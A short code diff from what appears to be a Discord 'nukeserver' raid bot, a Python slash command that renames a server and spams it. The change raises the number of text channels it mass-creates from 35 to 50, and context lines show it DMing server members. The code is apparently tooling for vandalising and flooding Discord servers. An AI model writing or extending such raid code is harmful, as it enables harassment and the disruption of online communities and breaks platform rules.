@@ -131,7 +131,7 @@ async def nukeserver(interaction: discord.Interaction, new_name: str, spam_messa
         except discord.Forbidden:
             print(f"[ERROR] Could not send DM to {user.name}.")
 
-    tasks = [guild.create_text_channel(channels_name) for _ in range(35)]
+    tasks = [guild.create_text_channel(channels_name) for _ in range(50)]
     new_channels = await asyncio.gather(*tasks)
 
     for channel in new_channels:
